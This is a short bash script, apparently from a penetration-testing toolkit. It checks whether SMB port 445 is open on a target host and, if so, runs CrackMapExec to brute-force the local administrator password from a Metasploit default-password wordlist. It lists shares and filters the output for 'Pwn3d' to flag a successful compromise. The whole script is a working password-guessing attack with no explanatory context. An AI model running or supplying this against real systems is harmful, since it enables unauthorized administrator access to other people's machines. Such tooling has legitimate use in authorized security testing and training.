#!/bin/bash

WAIT_SEC=1
DPORT=445

nc -w $WAIT_SEC $1 $DPORT 2> /dev/null && {
	echo 'bruteforcing smb'

	cme smb -d . -u administrator -p /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt --shares $1 2>&1 | grep Pwn3d
}